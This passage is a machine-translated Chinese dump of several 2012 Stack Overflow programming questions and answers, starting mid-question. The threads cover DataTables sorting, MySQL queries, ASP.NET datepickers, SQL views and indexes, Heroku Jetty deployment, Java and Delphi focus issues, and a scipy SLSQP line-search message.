[编辑]为了提供更多信息，我使用了几个秒表（用于更新、渲染和其他一些事件，都在不同的消息队列中）。如果我在 Update() 或应用程序的任何其他部分设置断点，秒表将准确测量它们之间花费的实时时间。这包括我花在调试应用程序的各种完全不相关的组件上的时间，这些组件被称为`Update()`or `Render()`or`Input()`等​​的下游。显然，模拟的 Timing（由传递给顶层 Update、Render 等函数的 GameTime 参数控制）将无法正常工作，如果，即使 CPU 只用了 13 毫秒就完成了更新功能，我还是*多花 13 秒调试*（查看变量，然后继续模拟）；问题是我会看到其他秒表突然**多出 13**秒的时间。如果还是不明白，那我再补充。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T12:11:51.933

请改用性能计数器。进程 CPU 时间应该提供一个很好的指标（但不如实时秒表准确）并且不应该干扰调试。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T12:10:12.337

一个可能的解决方案是使用 Debug.WriteLine() 将本地变量（或您尝试调试的任何数据）写入输出。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-07-10T15:20:18.500

您未能解释您实际尝试调试的内容以及为什么动画计时器完全按照预期对经过时间执行的操作是一个问题。要知道，当你休息时，时间会继续。实际问题是什么？

另外，请记住，在打开优化的版本中运行时，调试时的时间不会接近测量值。如果您想逐帧衡量时间框架，请使用商业分析工具。找出一个方法或函数需要多长时间正是它们的目的。

如果您想调试动画是否正常工作，请使用依赖注入和时间提供程序接口创建一个确定性测试，在其中提供时间而不是依赖于挂钟。

这篇文章有一个很好的例子： [https ://www.toptal.com/qa/how-to-write-testable-code-and-why-it-matters](https://www.toptal.com/qa/how-to-write-testable-code-and-why-it-matters)

# jquery - DataTables - 使用 aoColumnDefs 会引发错误

> ID：11155687
> 
> 赞同：0
> 
> 时间：2012-06-22T11:55:19.300
> 
> 标签：jquery, datatables

我正在使用 datatables jQuery Plugin numeric-comma 并希望按数字逗号值排序。

当我尝试按照数据表建议的方法时出现错误

错误：k[(qa ? qa : "string") + "-" + h[c][1]] 不是函数

这是我在下面给出的代码

```
var oTable = $('#transactiontable').dataTable( {
                "iDisplayLength": 10,
                "aLengthMenu": [[10, 20, 50, -1], [10, 20, 50, "All"]],
                "bProcessing": true,
                /*"bServerSide": true,*/
                "oLanguage": {
                    "sEmptyTable": "There is no transaction found.",
                    "sSearch": "Search all columns except few:"
                },
                "sAjaxSource": "transactions-processing.php",
                "sScrollX": "100%",
                "sScrollXInner": "3000px",
                "bScrollCollapse": true,
                "sPaginationType": "full_numbers",
                "aoColumnDefs": [
                    {
                        "bSortable": false,
                        "aTargets": [ 18,19,20,21,22 ]
                    },
                    {
                        "sType": "numeric-comma",
                        "aTargets": [ 3 ]
                    }
                ],
                /*"fnRowCallback": function( nRow, aaData, iDisplayIndex ) {
                    if ( aaData[1] == "5" ){
                        $('td:eq(1)', nRow).addClass( 'testrow' );
                    }
                },*/
                "fnInitComplete": function () {
                    new FixedColumns( oTable, {
                        "iLeftColumns": 2,
                        "iRightColumns": 1
                    });
                }
            });
            <?php }?>
        }); 
```

有人可以检查我的代码并指导我哪里错了......？

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T13:27:57.770

If you run your table through the DataTables debugger ( [http://debug.datatables.net/](http://debug.datatables.net/) ) that might give us a clue as to what is happening. What is the error you get if you use the unminified version of DataTables?

# mysql - 在mysql中使用正则表达式

> ID：11155690
> 
> 赞同：3
> 
> 时间：2012-06-22T11:55:31.373
> 
> 标签：mysql, regex

我有如下所示的查询。

```
SELECT 
  myWord, 
  LEAST (
    if (Locate('0',myWord) >0,Locate('0',myWord),999),
    if (Locate('1',myWord) >0,Locate('1',myWord),999),
    if (Locate('2',myWord) >0,Locate('2',myWord),999),
    if (Locate('3',myWord) >0,Locate('3',myWord),999),
    if (Locate('4',myWord) >0,Locate('4',myWord),999),
    if (Locate('5',myWord) >0,Locate('5',myWord),999),
    if (Locate('6',myWord) >0,Locate('6',myWord),999),
    if (Locate('7',myWord) >0,Locate('7',myWord),999),
    if (Locate('8',myWord) >0,Locate('8',myWord),999),
    if (Locate('9',myWord) >0,Locate('9',myWord),999)
  ) as myPos
FROM myTable; 
```

使用此查询，我找到***了 string 中第一个整数的位置***。

## 我的问题是

使用`regex`如何消除我拥有的那 10 行，如下所示。

```
 if (Locate('0',myWord) >0,Locate('0',myWord),999),
    if (Locate('1',myWord) >0,Locate('1',myWord),999),
    if (Locate('2',myWord) >0,Locate('2',myWord),999),
    if (Locate('3',myWord) >0,Locate('3',myWord),999),
    if (Locate('4',myWord) >0,Locate('4',myWord),999),
    if (Locate('5',myWord) >0,Locate('5',myWord),999),
    if (Locate('6',myWord) >0,Locate('6',myWord),999),
    if (Locate('7',myWord) >0,Locate('7',myWord),999),
    if (Locate('8',myWord) >0,Locate('8',myWord),999),
    if (Locate('9',myWord) >0,Locate('9',myWord),999) 
```

知道如何完成这项工作吗？

## [演示](http://sqlfiddle.com/#!2/d7bd4/15)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T12:20:05.090

看看[MySQL: Use REGEX to extract string (select REGEX)](https://stackoverflow.com/questions/4021507/mysql-use-regex-to-extract-string) and [the first result of google "mysql regex locate"](http://forums.devshed.com/mysql-help-4/using-a-regex-with-locate-588344.html)。似乎不可能用 mysql 中的正则表达式来做到这一点。您的解决方案已经是一个很好的方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T13:37:01.330

请参阅此[用户定义的功能](https://launchpad.net/mysql-udf-regexp)。

您可以`REGEXP_INSTR?`从那里找到数字的位置。（虽然没有测试过。）

# asp.net-mvc-3 - 模型绑定到asp.net mvc 3中的日期选择器jquery UI

> ID：11155696
> 
> 赞同：1
> 
> 时间：2012-06-22T11:56:09.080
> 
> 标签：asp.net-mvc-3, jquery-ui, model-binding

我已经`jQuery UI Helpers`使用以下代码用于日期选择器。

```
 <div>
        <label for="date">Select a date:</label> @Html.JQueryUI().Datepicker("date")
    </div> 
```

但是我怎样才能使用这个助手来模拟绑定：

```
 <div class="editor-label">
        @Html.LabelFor(model => model.BirthDate)
    </div>
    <div class="editor-field">
        @Html.EditorFor(model => model.BirthDate)
        @Html.ValidationMessageFor(model => model.BirthDate)
    </div> 
```

因此，该值被保存到数据库中。

我已经使用 Formcollection 在数据库中保存了出生日期的后值，如下所示：

```
[HttpPost]
        public ActionResult Edit(User user,FormCollection PostData)
        {
            if (ModelState.IsValid)
            {
                db.Users.Attach(user);
                user.BirthDate = DateTime.Parse(PostData["date"]);
                UpdateModel(user);
                //db.ObjectStateManager.ChangeObjectState(user, EntityState.Modified);
                db.SaveChanges();
                return RedirectToAction("Details");
            }
            ViewBag.RoleID = new SelectList(db.Roles, "ID", "Name", user.RoleID);
            return View(user);
        } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T12:15:11.430

尝试使用这个：

```
<script>
    $(function() {
        $("#BirthDate").datepicker();
    });
</script> 
```

# sql - 我想创建一个表的副本，列比原始的少...但仍从中更新

> ID：11155697
> 
> 赞同：2
> 
> 时间：2012-06-22T11:56:15.333
> 
> 标签：sql

我有一个 30gb 的表，它有 30-40 列。我使用此表创建报告，它会导致性能问题。我只使用该表的 4-5 列作为报告。因此，我想为报告创建第二个表。但是当原始表被更改而不使用触发器时，必须更新第二个表。

无论我的查询是什么，当查询执行时，sql 都会尝试缓存所有 30gb。当缓存满载后，sql开始使用磁盘。其实我想避免这个

我怎样才能做到这一点？有没有办法使用 ssis 提前谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-22T11:57:33.543

```
CREATE VIEW myView
AS
SELECT
  column1,
  column3,
  column4 * column7
FROM
  yourTable 
```

视图实际上只是一个存储的查询，就像一个宏。然后，您可以从该视图中进行选择，就好像它是一个普通表一样。

除非您使用实体化视图，否则它并不是真正的表格，它只是一个查询。所以它不会加速任何事情，但它确实封装了代码并帮助控制不同用户/登录可以读取哪些数据。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T13:09:27.823

您可以按照您的想法创建第二个表，并在表 1 更新时使用触发器来更新表 2。

然而，触发器本身就存在性能问题。插入和更新的速度会受到影响。我建议寻找更传统的替代方案来提高查询性能，这听起来像 SQL Server，因为你提到了 SSIS。

由于 30 列中只有 4-5 列，您是否尝试过添加涵盖查询的索引？我不确定您的 WHERE 子句中是否还有更多列，但您应该先尝试一下。覆盖索引实际上会完全按照您的描述进行，因为查询永远不需要触及该表。当然，这在空间和插入/更新性能方面确实会花费一些。总是有一个权衡。

最重要的是，我无法相信您需要从 30 GB 表中提取任何给定报告的大部分行。报告的数据太多了。过滤索引可以通过仅索引最有可能被请求的行来进一步提高查询性能。例如，如果您有一个列出过去日历月结果的报告，您可以添加一个条件来仅索引行`WHERE report_date > '5/1/2012'`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-22T13:24:56.710

如果您使用的是 SQL Server，您需要的是索引视图。使用您想要的列创建一个视图，然后在它们上放置一个索引。

索引视图将数据存储在视图中。它应该使视图与基础表保持最新，并且应该减少读取表的 I/O。注意：这假设您的 4-5 列比整个表格窄得多。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-22T13:02:22.497

Dems 对视图的回答似乎很理想，但如果您真的在寻找新表，请创建它并使用触发器自动更新它。

可以为主表上的所有插入、更新和删除操作添加放置在主表上的触发器。当动作发生时，触发器触发并且可以用于执行附加功能......例如更新您的新辅助表。您将从 Inserted 和 Deleted 表 ( [MSDN](http://msdn.microsoft.com/en-us/library/ms191300.aspx) )中提取

这里有很多关于触发器的优秀文章： [文章 1](https://stackoverflow.com/questions/4111498/trigger-for-insert-update-delete)、[文章 2](https://stackoverflow.com/questions/741414/insert-update-trigger-how-to-determine-if-insert-or-update)、[谷歌搜索](https://www.google.com/search?q=sql+triggers+insert+update+delete&ie=utf-8&oe=utf-8&aq=t&rls=org.mozilla:en-US:official&client=firefox-a)

# algorithm - 从 O(n * log(log(n))) 中的最大堆构建排序列表？

> ID：11155698
> 
> 赞同：1
> 
> 时间：2012-06-22T11:56:16.037
> 
> 标签：algorithm, sorting, heap

我有一个数组中表示的最大堆`A`，我有以下问题：

```
Is it possible to build a sorted list , based on the maximum 
heap - A - in O(n*log(log(n))) ? 
```

我的回答：不，我们不能！我们总是可以继续运行`A`并执行 MergeSort in `O(n*log(n))` 或 QuickSort in `O(n*log(n))`(worst case `O(n^2)`)。

我还想也许要建立实际的堆`A`，这需要`O(n)`，然后从那里提取所有元素`O(n*log(n))`，但我在这里一无所获。

目前我看不到任何选项`O(n*log(log(n)))`，任何想法？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-22T12:33:11.997

我认为这是不可能的：有一个算法可以在 o(n) 中构建一个最大堆（看看这里[有一个 O(n) 算法来构建一个最大堆吗？](https://stackoverflow.com/questions/1787252/is-there-a-on-algorithm-to-build-a-max-heap)）所以如果你可以在 o( n) 然后在 o(n *log(log(n)) 中排序，你可以得到一个在 o(n log(log(n)) 中工作的排序算法，*如果你没有关于你的初始信息，这是不可能的输入。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-22T14:43:06.680

如果您有一个数组形式的最大堆，那么在该数组上使用诸如插入排序之类的东西应该会产生非常好的结果。数组形式的最大堆几乎已排序（降序），当数组几乎已排序时，插入的最佳情况是 O(n)。它仍然会有 O(n^2) 最坏的情况，但我认为你不会遇到最坏的情况。

# zend-framework - Zend Doctrine 会话 SaveHandler。如何让它发挥作用？

> ID：11155699
> 
> 赞同：0
> 
> 时间：2012-06-22T11:56:23.463
> 
> 标签：zend-framework, doctrine, zend-session

我试图了解如何使用数据库表设置会话保存处理程序（使用 Zend/Doctrine），但我对它应该如何工作感到有点困惑。

我发现[这个](http://framework.zend.com/wiki/display/ZFPROP/Zend_Session_SaveHandler_Doctrine+-+Matthew+Lurz)提案我认为它适合我的需要，因为我也在使用 Doctrine。

一切都设置好了：适当的类、数据库表和 Doctrine 模型。我没有得到的是这部分：

```
$config = array(
'tableName'         => 'Session',
'dataColumn'        => 'data',
'lifetimeColumn'    => 'lifetime',
'modifiedColumn'    => 'modified',
'primaryKeyColumn'  => 'id',
);

Zend_Session::setSaveHandler(new Zend_Session_SaveHandler_Doctrine($config));
Zend_Session::start(); 
```

我在这里很困惑。这部分应该去哪里？有人可以帮忙吗？或者也许指向我一些有用的教程来做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T11:59:10.127

这应该在您的主引导类 ( `application/Bootstrap.php`) 中。所以我会添加这样的东西：

```
protected function _initDoctrineSession()
{
    $config = array(
        'tableName'         => 'Session',
        'dataColumn'        => 'data',
        'lifetimeColumn'    => 'lifetime',
        'modifiedColumn'    => 'modified',
        'primaryKeyColumn'  => 'id',
    );

    Zend_Session::setSaveHandler(new Zend_Session_SaveHandler_Doctrine($config));
    Zend_Session::start();
} 
```

# javascript - 将提交按钮添加到 jquery 星级评分

> ID：11155706
> 
> 赞同：0
> 
> 时间：2012-06-22T11:57:05.473
> 
> 标签：javascript, jquery, rating

我的 smarty 模板中有一个默认的星级评分系统。它适用于桌面用户，但在移动设备中，我发现我总是点击错误的值。我希望我可以添加一个按钮来提交我的评分，而不是在用户点击星星时自动提交。

```
 $(document).ready(function(){
            $(".one-star, .two-stars, .three-stars, .four-stars, .five-stars").click(function() {
                $("#current_rating").width($(this).html()*30);
                $.ajax({data: ({ action: 'save_rating', rating: $(this).html(), listing_id: <?php echo $id; ?>}), success: function() { window.location.href = '<?php echo $this->escape(URL); ?>'; }});
                return false;
            });
        });

            <ul class="star-rating">
                <li id="current_rating" class="current-rating" style="width:<?php echo $rating*30; ?>px;"><?php echo $rating; ?> Stars.</li>
                    <li><a href="#" title="1 star" class="one-star">1</a></li>
                    <li><a href="#" title="2 stars" class="two-stars">2</a></li>
                    <li><a href="#" title="3 stars" class="three-stars">3</a></li>
                    <li><a href="#" title="4 stars" class="four-stars">4</a></li>
                    <li><a href="#" title="5 stars" class="five-stars">5</a></li>
            </ul> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T12:34:17.487

使用对话框来确认用户的选择怎么样？

```
 $(document).ready(function(){
        $(".one-star, .two-stars, .three-stars, .four-stars, .five-stars").click(function() {

            var currentrating = $(this).text()
            var r = confirm("Do you want to submit a rating of " + currentrating + "?") 

            if(r==true){ 

                 $("#current_rating").width($(this).html()*30);

                 $.ajax({data: ({ action: 'save_rating', rating: $(this).html(), listing_id: <?php echo $id; ?>}), success: function() { window.location.href = '<?php echo $this->escape(URL); ?>'; }});

                 return false;

            } else {

                 return false;

            }
        });
    });

        <ul class="star-rating">
            <li id="current_rating" class="current-rating" style="width:<?php echo $rating*30; ?>px;"><?php echo $rating; ?> Stars.</li>
                <li><a href="#" title="1 star" class="one-star">1</a></li>
                <li><a href="#" title="2 stars" class="two-stars">2</a></li>
                <li><a href="#" title="3 stars" class="three-stars">3</a></li>
                <li><a href="#" title="4 stars" class="four-stars">4</a></li>
                <li><a href="#" title="5 stars" class="five-stars">5</a></li>
        </ul> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-22T12:45:23.847

将此元素添加到您的 html 部分：

```
<input type=button id=submit_rating value="submit rate" /> 
```

并将您的 jquery 代码更改为：

```
$(document).ready(function(){
        var rate=null;
        $(".one-star, .two-stars, .three-stars, .four-stars, .five-stars").click(function() {
             rate = $(this).html();
             $("#current_rating").width(rate*30);
        });
        $('#submit_rating').click(function(){
                $.ajax({data: ({ action: 'save_rating', rating: rate, listing_id: <?php echo $id; ?>}), success: function() { window.location.href = '<?php echo $this->escape(URL); ?>'; }});
                return false;
        });
    }); 
```

# html - CSS 显示调整大小和裁剪的图像 - 续

> ID：11155707
> 
> 赞同：0
> 
> 时间：2012-06-22T11:57:07.397
> 
> 标签：html, css, image

这是[CSS Display an Image Resized and Cropped](https://stackoverflow.com/questions/493296/css-display-an-image-resized-and-cropped)的延续。该用户的答案似乎没问题，但我需要一些帮助来改进该答案......

问：resize（缩放）如何与运行时图像的大小相关联。即我不想硬编码像“宽度：320px；高度：221px；” 在样式中 - 如果您预先知道图像的尺寸，则可以使用。

这里有一些jsfiddles：

[http://jsfiddle.net/VdX68/](http://jsfiddle.net/VdX68/) - 基于原始线程答案。如果您预先知道图像的尺寸，则可以使用。

[http://jsfiddle.net/VdX68/4/](http://jsfiddle.net/VdX68/4/) - 您不必知道图像的尺寸，但仅适用于 100% 的比例。（这里我只是从 .scalePan 类中删除了宽度，高度。

[http://jsfiddle.net/VdX68/2/](http://jsfiddle.net/VdX68/2/) - 使用宽度和高度作为百分比。这会将图像缩放到包含 div 的大小，而不是图像原始尺寸。

我正在寻找一种方法将图像缩放到原始尺寸的 %，而不是它所在容器的 %。

非常感谢任何帮助。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-06-22T12:16:43.010

我知道你想这样做，但我不完全确定。

```
$(document).ready(function() {
    var wdth = $('img').width();
    var hght = $('img').height();

    $('img').css('width',  wdth / 100 * 90 + "px"); // new width is 90% width of image
    $('img').css('height', hght / 100 * 70 + "px"); // new height 70% height of image
}); 
```

工作示例：http: [//jsfiddle.net/VdX68/18/](http://jsfiddle.net/VdX68/18/)

您不必使用 JQuery，也可以使用常规 javascript 来执行此操作。

# heroku - 在 Heroku 中使用 Jetty Runner 运行 War 文件

> ID：11155712
> 
> 赞同：0
> 
> 时间：2012-06-22T11:57:28.003
> 
> 标签：heroku, jetty, war

如果有人可以在heroku上给我一些帮助，我将不胜感激。

如果我在本地控制台上运行此命令，它适用于 -> localhost:8080

> java -jar 工具/jetty-runner-7.6.3.jar --port 8080 目标/scala-2.9.1/myapp.war

* * *

然后我用这个创建Procfile：

> 网页：java -jar 工具/jetty-runner-7.6.3.jar --port 8080 目标/scala-2.9.1/myapp.war

* * *

然后我通过运行测试：

> 工头开始

它也适用于 -> localhost:8080

* * *

但是在我部署了应用程序并打开heroku之后，它就不起作用了......

> [成功] 总时间：1 s，完成时间：2012/06/22 11:16:59 AM
> 
> -----> 发现进程类型
> 
> ```
>  Procfile declares types -> web 
> ```
> 
> -----> 编译后的 slug 大小为 70.0MB
> 
> -----> 正在启动...完成，v5
> 
> ```
>  http://myapp.herokuapp.com deployed to Heroku 
> ```
> 
> 到 git@heroku.com:myapp.git
> 
> XXXXX..XXXXX 主人 -> 主人

* * *

$heroku 日志

> 2012-06-22T11:14:54+00:00 heroku[slugc]：Slug 编译开始
> 
> 2012-06-22T11:17:57+00:00 heroku[api]：由 my_email@my_email.com 创建的版本 v5
> 
> 2012-06-22T11:17:57+00:00 heroku[api]：通过 my_email@my_email.com 部署 dcdd123
> 
> 2012-06-22T11:18:00+00:00 heroku[slugc]: Slug 编译完成
> 
> 2012-06-22T11:18:21+00:00 heroku [路由器]：错误 H14（没有运行 Web 进程）-> GET myapp.herokuapp.com/dyno= queue= wait= service= status=503 bytes=
> 
> 2012-06-22T11:18:30+00:00 heroku [路由器]：错误 H14（没有运行 Web 进程）-> GET myapp.herokuapp.com/dyno= queue= wait= service= status=503 bytes=

* * *

有什么想法、建议吗？谢谢，

问候， 安德烈

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T15:04:37.223

Andre - 我们有一个 Heroku Labs 功能，允许您将 WAR 文件直接部署到 Heroku。查看[https://gist.github.com/a8c62301591a11b4c6e9](https://gist.github.com/a8c62301591a11b4c6e9)以获取有关如何执行此操作的详细信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-10-11T10:09:50.787

如果你使用 jetty runner 来运行你的战争，你不需要硬编码端口号。Heroku 在内部设置端口。

所以你的 Procfile 应该是这样的：

`java -jar tools/jetty-runner-7.6.3.jar --port $PORT target/scala-2.9.1/myapp.war`

# java - Java HashSet 同步查询

> ID：11155714
> 
> 赞同：0
> 
> 时间：2012-06-22T11:57:40.137
> 
> 标签：java, synchronization, hashset

同步问题：

```
Set s = Collections.synchronizedSet(new HashSet());
private Object monitor_ = new Object();

//Set has element added in another routine...

//Called by some thread1, thread2, ...
TimerTask run(){ //method which executes every 1 min
  synchronized(monitor_) {
  s.isEmpty()
  // ...
  // waits for 30 seconds
  // JNI call
  // ...
 }
}

//Called by cleanup thread
removecall()
{
 synchronized( monitor_ ) {
   s.remove( something );
 }
} 
```

`Problem:` 当 TimerTask 运行方法正在执行时，清理线程必须等待。无需等待即可处理这种情况的任何有效方法。例如重入锁

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T12:06:04.177

并发集可能是解决方案：[CopyOnWriteArraySet](http://docs.oracle.com/javase/6/docs/api/java/util/concurrent/CopyOnWriteArraySet.html)或 Collections.newSetFromMap( [ConcurrentHashMap](http://docs.oracle.com/javase/6/docs/api/java/util/concurrent/ConcurrentHashMap.html) )，但鉴于我对您的问题的了解，很难说。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T12:47:23.057

试试这个，如果你想让你的工作**同时****完成**，`use 2 different objects in the synchronized block.`

例如：

```
Set s = Collections.synchronizedSet(new HashSet());

private Object monitor_1 = new Object();
private Object monitor_2 = new Object();

TimerTask run(){ //method which executes every 1 min
  synchronized(monitor_1) {
  s.isEmpty()

 }
}

removecall()
{
 synchronized( monitor_2) {
   s.remove( pcg );
 }

} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-22T12:03:09.960

如果您使用[ConcurrentLinkedQueue](http://docs.oracle.com/javase/1.5.0/docs/api/java/util/concurrent/ConcurrentLinkedQueue.html)作为“信使”，您可以轻松地在线程之间进行通信。然后您可以简单地在该队列中放入一些东西，例如一个字符串，如果线程完成工作，则发出信号，例如`public static String DONE = "DONE"`.

现在您只需每隔一段时间轮询一次队列：如果它不为空，您可以执行任何操作。这使您的程序流真正异步并且很容易扩展。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-22T12:05:27.790

我想到了几件事：

*   当您调用`monitor_.wait()`时，线程释放锁定`monitor_`，因此同步的其他线程`monitor_`可以执行
*   另一种选择是您只是无限期地等待，并覆盖修改哈希集的方法，以便它们调用`monitor_.notify()`，这将使您的`run()`方法脱离等待（）。这将比定期检查更干净，并使整个系统反应更快，因为将立即检测到更改，而不是每（平均）30 秒/2

# delphi - DELPHI Edit.OnExit by TAB，在焦点错误上显示窗口结果

> ID：11155718
> 
> 赞同：1
> 
> 时间：2012-06-22T11:57:57.703
> 
> 标签：delphi

我在以下情况下遇到问题：

*   2 编辑
*   在 Edit1 中键入内容并按 TAB，焦点转到 Edit2
*   Edit1.OnExit -> 显示带有消息“处理中...”的表单（进行冗长的验证）

表单关闭后，Edit2 上的焦点似乎“崩溃”了...... - Edit2 中的孔 TEXT 未选中 - carret 没有闪烁

例子：

*   创建一个新表格
*   进行 2 次编辑
*   在 Edit1 中将此设置为 OnExit 事件：

    ```
    procedure TForm1.Edit1Exit(Sender: TObject);
    begin
      with TForm.CreateNew(self) do
         try
           Width := 100;
           Height := 50;
           Position := poMainFormCenter;
           show;
           sleep(200);
         finally
           Free;
         end;
    end; 
    ```

*   运行应用程序

*   在 Edit1 中设置焦点并按 TAB

我在用着：

*   德尔福 7 企业版
*   视窗 7 x64

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-22T14:19:33.400

这是一个已知问题。当您在完成最后一次焦点更改之前更改焦点时，Windows 会出现问题（例如，焦点开始从 更改`Edit1`为`Edit2`，但`Edit1.OnExit`会执行一些操作以将焦点更改为另一个控件或表单。

例如，当应用程序尝试在`OnExit`事件中进行验证，然后在验证失败时尝试将焦点返回到原始控件时，就会发生这种情况。

最简单的解决方案是向您的表单句柄发布消息`OnExit`，并在那里处理焦点更改需求。一旦目标控件获得输入焦点，它将触发，Windows 不会感到困惑。

```
const
   UM_EDIT1_EXITED = WM_USER + 1;

type
  TForm1=class(TForm)
  ...
  private
    procedure UMEdit1Exited(var Msg: TMessage); message UM_EDIT1_EXITED;
  end;

implementation

procedure TForm1.Edit1Exit(Sender: TObject);
begin
  PostMessage(Handle, UM_EDIT1_EXITED, 0, 0);
end;

procedure TForm1.UMEdit1Exited(var Msg: TMessage);
begin
  // Show your other form here
end; 
```

[来自TeamB](http://www.teamb.com)的 Peter 博士的旧 Borland NG 帖子：

> 这是我关于“从 OnExit 显示对话框”问题的一般布道：
> 
> 如果触发了 OnExit 处理程序（这发生在响应 Windows 消息 WM_KILLFOCUS），则 Windows 处于焦点更改之中。如果您在处理程序中执行导致另一个焦点更改的操作（例如弹出消息框或执行 SetFocus 调用），Windows 会非常混乱。缺少的光标就是一个症状。
> 
> 如果您必须从 OnExit 处理程序向您的用户显示消息，请这样做：
> 
> 1.  在单元的接口部分的某处为用户消息定义一个常量，在表单的类型声明上方
>     
>     
>     
>     '常量 UM_VALIDATE = WM_USER + 200;'
>     
>     
> 2.  为您的表单提供此消息的处理程序，最好放在类声明的私有部分：
>     
>     
>     
>     `Procedure UMValidate( Var Msg: TMessage ); message UM_VALIDATE;`
>     
>     
> 3.  如果字段的内容不正确，则从 OnExit 处理程序向表单发布 UM_VALIDATE 消息。您可以在消息的 wparam 和 lparam 参数中传递附加信息，例如错误号和 Sender 对象。事实上，您可以在 UMValidate 处理程序中进行整个验证！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-22T12:02:44.740

我不确定这里到底发生了什么，但看起来消息的处理顺序有点混乱。而不是杀死你的其他形式`Free`，使用`Release`和焦点将按照你的意愿行事。

另一种选择是使用`ShowModal`而不是`Show`. 通常，您会以模态方式显示*处理*对话框，因为您不希望用户在处理时对主表单进行修改。如果你这样做，那么你可以继续使用`Free`.

# scipy - 线搜索的正方向导数

> ID：11155721
> 
> 赞同：16
> 
> 时间：2012-06-22T11:58:23.533
> 
> 标签：scipy

scipy.optimize '线搜索的正方向导数'的 smode 是什么意思？

例如在 fmin_slsqp [http://docs.scipy.org/doc/scipy/reference/generated/scipy.optimize.fmin_slsqp.html](http://docs.scipy.org/doc/scipy/reference/generated/scipy.optimize.fmin_slsqp.html)

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-06-24T11:41:41.973

这些优化算法通常通过选择下降方向，然后对该方向执行线搜索来工作。我认为这条消息意味着优化器进入了一个位置，它无法找到目标函数值减小的方向（足够快），但也无法验证当前位置是否为最小值。

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2016-04-18T03:29:15.673

我仍然不知道这意味着什么，但如何解决它。基本上，优化后的函数需要返回一个较小的值。

```
F(x):
    ...
    return value / 10000000 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2017-06-12T13:11:15.187

为避免更改您的功能，您还可以尝试使用 ftol 和 eps 参数。将 ftol 更改为更高的值相当于将函数更改为更小的值。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2018-08-22T11:12:08.407

您收到此错误的一种情况是

1.  `x0`超出您在 中定义的有效范围`bounds`。
2.  并且对于外部的值达到无约束的最大值`bounds`。

我将设置一个假设的优化问题，使用两个不同的初始值运行它并打印输出`scipy.optimize`：

```
import numpy as np
from scipy import optimize

H = np.array([[2., 0.],
              [0., 8.]])

c = np.array([0, -32])

x0 = np.array([0.5, 0.5])    # valid initial value
x1 = np.array([-1, 1.1])     # invalid initial value

def loss(x, sign=1.):
    return sign * (0.5 * np.dot(x.T, np.dot(H, x)) + np.dot(c, x))

def jac(x, sign=1.):
    return sign * (np.dot(x.T, H) + c)

bounds = [(0, 1), (0, 1)] 
```

现在损失函数、梯度、x0 和边界已经到位，我们可以解决问题：

```
def solve(start):
    res = optimize.minimize(fun=loss, 
                            x0=start, 
                            jac=jac, 
                            bounds=bounds,
                            method='SLSQP')
    return res

solve(x0)   # valid initial value
# fun: -27.999999999963507
# jac: array([ 2.90878432e-14, -2.40000000e+01])
# message: 'Optimization terminated successfully.'
# ...
#  status: 0
# success: True
# x: array([1.45439216e-14, 1.00000000e+00])

solve(x1)      # invalid initial value:
#  fun: -29.534653465326528
#  jac: array([ -1.16831683, -23.36633663])
#  message: 'Positive directional derivative for linesearch'
#  ...
#  status: 8
#  success: False
#  x: array([-0.58415842,  1.07920792]) 
```

作为@pv。在接受的答案中指出，算法无法验证这是最小值：

> 我认为这条消息意味着优化器进入了一个位置，它无法找到目标函数值减小的方向（足够快），但也无法验证当前位置是否为最小值。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-06-22T13:41:39.447

这不是一个完整的答案，但您可以在此处查看生成 smode 的源代码：

[https://github.com/scipy/scipy/blob/master/scipy/optimize/slsqp/slsqp_optmz.f](https://github.com/scipy/scipy/blob/master/scipy/optimize/slsqp/slsqp_optmz.f)

可以在第 412 行和第 486 行中找到（您所询问的“线搜索的正方向导数”）的分配`mode = 8`。如果可以弄清楚为什么在代码中分配它们，那么您已经得到了答案。

# mysql - 选择 MySQL 中存在的随机行

> ID：11155725
> 
> 赞同：2
> 
> 时间：2012-06-22T11:58:34.040
> 
> 标签：mysql

> **可能重复：**
> [如何在 SQL 中请求随机行？](https://stackoverflow.com/questions/19412/how-to-request-a-random-row-in-sql)

目前使用：

```
$randomQuery = mysql_fetch_row(mysql_query("SELECT * FROM `table` WHERE `id` >= RAND() * (SELECT MAX(`id`) FROM `table`) LIMIT 1")); 
```

表结构：

```
id:
 2 
 4
 5 
```

我想确保它正在选择现有的行。例如，它不应该在其随机化函数中使用 1 或 3。有没有办法在 MySQL 中做到这一点？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-06-22T12:02:00.890

我认为

```
SELECT * FROM table ORDER BY RAND() LIMIT 1 
```

会成功的。

看：

[http://dev.mysql.com/doc/refman/5.0/en/mathematical-functions.html#function_rand](http://dev.mysql.com/doc/refman/5.0/en/mathematical-functions.html#function_rand)

* * *

## 回答 #2

> 赞同：4
> 
